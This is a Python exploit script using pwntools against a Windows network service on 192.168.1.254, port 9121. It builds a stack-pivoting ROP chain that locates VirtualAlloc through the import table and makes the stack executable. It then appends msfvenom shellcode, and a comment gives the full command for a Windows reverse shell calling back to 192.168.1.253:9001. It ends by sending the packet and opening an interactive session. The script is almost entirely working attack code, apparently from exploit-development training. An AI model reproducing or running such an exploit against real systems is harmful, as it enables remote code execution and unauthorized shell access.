#!/usr/bin/env python3

import pwn

def payload():
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.253 LPORT=9001 -f raw -o payload.bin -b '\x00\x0a\x01\x02\x03\x0d'
    with open("./payload.bin", "rb") as f:
        return f.read()

max_buf = 0x400

body = pwn.util.cyclic.cyclic_metasploit(max_buf)

deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x63413187 - 0x24)
eip_off = pwn.util.cyclic.cyclic_metasploit_find(0x33654132)
stack_pivot = 0x10039f9e # add esp, 0x4e8; ret 0x18;
addr_realign = 0x10136de0 # add esp, 0x2c; ret;
rop_start = deref_off - 4

addr_iattable = 0x1016a0b0 #  773b3760 KERNEL32!ReadFile
addr_popediret = 0x10064def # pop edi; ret;
ropnop = 0x10040826 # ret;
addr_ppr = 0x1015a2f0 # pop eax; pop ebx; ret;
addr_ppr0xc = 0x100de5ef # pop eax; pop edi; ret 0xc;
addr_popeaxret = 0x100fd644 # pop eax; ret;
addr_derefeaxret = 0x1014fc8c # mov eax, dword ptr [eax]; ret;
addr_popebpret = 0x1005edc5 # pop ebp; ret;
addr_subeaxebp_pppr_ret = 0x1014e1a8 # sub eax, ebp; pop esi; pop ebp; pop ebx; ret;
addr_derefeaxesi_calledi = 0x10138850 # mov esi, dword ptr [eax]; push eax; call edi;
addr_pushespret = 0x100bc9e5 # push esp; ret;
addr_incebx_calledi = 0x101260ab # inc ebx; add al, 0x50; call edi;
addr_xorecx = 0x10041e60 # xor ecx, ecx; cmp eax, 1; sete cl; mov eax, ecx; ret;
addr_add0x10ecx = 0x10157580 # add ecx, 0x10; cmp eax, 0x28; jb 0x15757b; xor eax, eax; ret;
addr_popecxret = 0x10043c28 # pop ecx; ret;
addr_movedxeax_saredx = 0x10142f9d# mov edx, eax; mov byte ptr [ecx + 5], al; sar edx, 8; mov byte ptr [ecx + 4], dl; ret;
addr_saredx = 0x10142fa2 # sar edx, 8; mov byte ptr [ecx + 4], dl; ret; 
addr_incedx = 0x1012bb29 # inc edx; mov ax, dx; ret;
addr_pushadret = 0x1011ae3d # pushad; ret;
addr_popebxret = 0x100430c7 # pop ebx; ret;

body = b'A' * rop_start
body += pwn.p32(addr_realign)
body += b'B' * (eip_off - len(body))
body += pwn.p32(stack_pivot)
# --- rop chain start --- #

#ESI = pointer to VirtualAlloc
body += pwn.p32(addr_popeaxret)
body += pwn.p32(addr_iattable)
body += pwn.p32(addr_derefeaxret)
body += pwn.p32(addr_popebpret)
body += pwn.p32(0x100000000 - 0x05de34)
body += pwn.p32(addr_subeaxebp_pppr_ret)
body += pwn.p32(0x90909090)*3
body += pwn.p32(addr_popediret)
body += pwn.p32(addr_ppr)
body += pwn.p32(addr_derefeaxesi_calledi)

#EDX = flAllocationType #0x1000
body += pwn.p32(addr_popecxret)
body += pwn.p32(0x1020f040)
body += pwn.p32(addr_popeaxret)
body += pwn.p32(0x0FFF4040)
body += pwn.p32(addr_movedxeax_saredx)
body += pwn.p32(addr_saredx)
body += pwn.p32(addr_incedx)

#ECX = flProtect # 0x40
body += pwn.p32(addr_xorecx)
for i in range(4):
    body += pwn.p32(addr_popeaxret)
    body += pwn.p32(0x90909090)
    body += pwn.p32(addr_add0x10ecx)

#EBX = dwSize # not 0
#EDI = ROPNOP (RET)
body += pwn.p32(addr_popebxret)
body += pwn.p32(0xFFFFFFFF)
body += pwn.p32(addr_popediret)
body += pwn.p32(addr_ppr0xc)
body += pwn.p32(addr_incebx_calledi)
body += b'A'*4
body += pwn.p32(addr_popediret)
body += pwn.p32(0x90909090)*3
body += pwn.p32(addr_ppr0xc)
body += pwn.p32(addr_incebx_calledi)
body += pwn.p32(ropnop)

#EAX = NOP (0x90909090)
body += pwn.p32(addr_popeaxret)
body += pwn.p32(0x90909090)*3
body += pwn.p32(0x90909090)

#EBP = pointer to JMP ESP
body += pwn.p32(addr_popebpret)
body += pwn.p32(addr_pushespret)

body += pwn.p32(addr_pushadret)
body += payload()

header = b"\x75\x19\xba\xab"
header += pwn.p32(3)
header += pwn.p32(1)
header += pwn.p32(len(body))*2

header += pwn.p32(body[-1])

packet = header+body


s = pwn.remote('192.168.1.254', 9121)

s.send(packet)

response = s.recv(1024)

s.interactive()
